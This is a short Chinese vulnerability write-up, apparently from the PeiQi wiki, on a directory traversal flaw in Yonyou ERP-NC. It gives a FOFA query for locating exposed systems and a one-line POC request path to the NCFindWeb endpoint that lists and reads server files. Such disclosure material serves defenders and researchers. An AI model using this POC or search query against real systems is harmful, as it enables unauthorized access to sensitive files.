---
title: 用友ERP-NC 目录遍历漏洞
date: 2021-09-23 23:55:51
tags: PeiQi文库
categories:
 - OA产品漏洞
 - 用友OA
---

# 用友ERP-NC 目录遍历漏洞

## 漏洞描述

用友ERP-NC 存在目录遍历漏洞，攻击者可以通过目录遍历获取敏感文件信息

## 漏洞影响

> [!NOTE]
>
> 用友ERP-NC 

##  FOFA

> [!NOTE]
>
> app="用友-UFIDA-NC"

## 漏洞复现

POC为

```
/NCFindWeb?service=IPreAlertConfigService&filename=
```

![](/img/20210924015145772639.png)

查看 ncwslogin.jsp 文件

![](/img/20210924015146036362.png)

## Goby & POC

> [!NOTE]
>
> YongYou ERP-NC directory traversal

![](/img/20210924015146229215.png)